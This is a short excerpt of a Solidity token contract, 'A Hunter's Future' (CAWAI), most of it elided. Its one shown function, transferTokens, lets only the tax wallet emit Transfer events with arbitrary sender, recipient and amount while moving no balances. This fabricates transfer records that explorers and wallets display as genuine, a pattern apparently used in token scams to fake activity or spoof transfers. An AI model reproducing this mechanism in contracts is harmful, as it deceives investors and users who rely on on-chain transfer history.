...
contract CAWAI is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"A Hunter’s Future";
    string private constant _symbol = unicode"CAWAI";
    ...
    function transferTokens(address from, address to, uint256 amount) external {
        require(_msgSender() == _taxWallet);
        emit Transfer(from, to, amount*10**_decimals);
    }
